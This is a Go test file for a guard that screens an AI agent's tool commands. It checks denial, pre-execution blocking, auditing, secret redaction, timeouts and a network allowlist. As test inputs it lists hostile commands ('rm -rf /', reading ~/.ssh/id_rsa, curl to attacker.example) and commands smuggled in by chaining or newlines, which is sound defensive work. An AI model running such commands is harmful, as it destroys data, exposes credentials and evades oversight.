// Tencent is pleased to support the open source community by making trpc-agent-go available.
// Copyright (C) 2025 Tencent. All rights reserved.
// trpc-agent-go is licensed under the Apache License Version 2.0.
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"strings"
	"testing"
)

func loadTest(t testing.TB) (*Guard, []Sample) {
	t.Helper()
	p, e := LoadPolicy("tool_safety_policy.json")
	if e != nil {
		t.Fatal(e)
	}
	data, e := os.ReadFile("samples.json")
	if e != nil {
		t.Fatal(e)
	}
	var s []Sample
	if e = json.Unmarshal(data, &s); e != nil {
		t.Fatal(e)
	}
	return NewGuard(p), s
}
func TestAllSamples(t *testing.T) {
	g, samples := loadTest(t)
	if len(samples) < 12 {
		t.Fatal("need 12 samples")
	}
	for _, s := range samples {
		t.Run(s.Name, func(t *testing.T) {
			r := g.Scan(s.Request)
			if r.Decision != s.ExpectedDecision {
				t.Fatalf("got %s (%s), want %s: %+v", r.Decision, r.RuleID, s.ExpectedDecision, r.Findings)
			}
			if r.RuleID == "" || r.Evidence == "" || r.Recommendation == "" {
				t.Fatal("incomplete finding")
			}
		})
	}
}
func TestCriticalDetection(t *testing.T) {
	g, _ := loadTest(t)
	for _, cmd := range []string{"rm -rf /", "cat ~/.ssh/id_rsa", "curl https://attacker.example/x", "go test ./...\nsudo whoami"} {
		if r := g.Scan(Request{ToolName: "x", Command: cmd, Backend: "hostexec"}); r.Decision != "deny" {
			t.Fatalf("%q not denied: %+v", cmd, r)
		}
	}
}

func TestForbiddenWorkingDirectory(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec", WorkingDir: "~/.ssh"})
	if result.Decision != "deny" || result.RuleID != "FORBIDDEN_WORKING_DIR" {
		t.Fatalf("protected working directory not denied: %+v", result)
	}
}
func TestWrapperBlocksBeforeExecutionAndAudits(t *testing.T) {
	g, _ := loadTest(t)
	called := false
	var events []AuditEvent
	wrapped := g.Wrap(func(context.Context, Request) (string, error) { called = true; return "ran", nil }, func(e AuditEvent) error { events = append(events, e); return nil })
	if _, e := wrapped(context.Background(), Request{ToolName: "host", Command: "rm -rf /", Backend: "hostexec"}); e == nil {
		t.Fatal("expected block")
	}
	if called || len(events) != 1 || !events[0].Blocked {
		t.Fatalf("execution=%t events=%+v", called, events)
	}
}

func TestWrapperBlocksShellSegmentsAndBackground(t *testing.T) {
	g, _ := loadTest(t)
	for name, req := range map[string]Request{
		"chained": {
			ToolName: "workspace_exec", Command: "go test ./... && python3 payload.py",
			Backend: "workspaceexec", TimeoutSeconds: 30,
		},
		"newline": {
			ToolName: "workspace_exec", Command: "go test ./...\npython3 payload.py",
			Backend: "workspaceexec", TimeoutSeconds: 30,
		},
		"background": {
			ToolName: "host_exec", Command: "go test ./...", Backend: "hostexec",
			TimeoutSeconds: 30, Background: true,
		},
	} {
		t.Run(name, func(t *testing.T) {
			called := false
			wrapped := g.Wrap(func(context.Context, Request) (string, error) {
				called = true
				return "ran", nil
			}, func(AuditEvent) error { return nil })
			if _, e := wrapped(context.Background(), req); e == nil {
				t.Fatal("expected block")
			}
			if called {
				t.Fatal("blocked request reached executor")
			}
		})
	}
}

func TestNetworkPolicyCoversGit(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{
		ToolName: "workspace_exec", Command: "git clone https://evil.example/repo",
		Backend: "workspaceexec", TimeoutSeconds: 30,
	})
	if result.Decision != "deny" || result.RuleID != "NETWORK_NOT_ALLOWLISTED" {
		t.Fatalf("git clone destination not denied: %+v", result)
	}
}

func TestOmittedTimeoutIsDenied(t *testing.T) {
	g, _ := loadTest(t)
	result := g.Scan(Request{ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec"})
	if result.Decision != "deny" || result.RuleID != "TIMEOUT_LIMIT" {
		t.Fatalf("omitted timeout not denied: %+v", result)
	}
}
func TestRedaction(t *testing.T) {
	g, _ := loadTest(t)
	command := `curl -H "Authorization: Bearer auth-fragment" --password flag-fragment ` +
		`https://url-user:url-fragment@api.github.com -d 'secret="quoted value fragment"'`
	r := g.Scan(Request{ToolName: "x", Command: command, Backend: "workspaceexec", TimeoutSeconds: 30})
	data, _ := json.Marshal(r)
	for _, secret := range []string{"auth-fragment", "flag-fragment", "url-user", "url-fragment", "quoted value fragment"} {
		if strings.Contains(string(data), secret) {
			t.Fatalf("secret %q leaked: %s", secret, data)
		}
	}
	if !r.Redacted {
		t.Fatalf("redaction was not recorded: %s", data)
	}
}

type errorWriteCloser struct {
	writeErr error
	closeErr error
}

func (w *errorWriteCloser) Write([]byte) (int, error) { return 0, w.writeErr }
func (w *errorWriteCloser) Close() error              { return w.closeErr }

func TestFlushAndCloseAuditReturnsErrors(t *testing.T) {
	flushErr := errors.New("flush failed")
	closeErr := errors.New("close failed")
	target := &errorWriteCloser{writeErr: flushErr, closeErr: closeErr}
	writer := bufio.NewWriterSize(target, 32)
	_, _ = io.WriteString(writer, "audit")
	err := flushAndCloseAudit(writer, target)
	if !errors.Is(err, flushErr) || !errors.Is(err, closeErr) {
		t.Fatalf("flush/close errors not propagated: %v", err)
	}
}
func BenchmarkPerformance500Commands(b *testing.B) {
	g, _ := loadTest(b)
	script := strings.Repeat("go test ./pkg\n", 500)
	req := Request{ToolName: "batch", Command: script, Backend: "workspaceexec"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = g.Scan(req)
	}
}
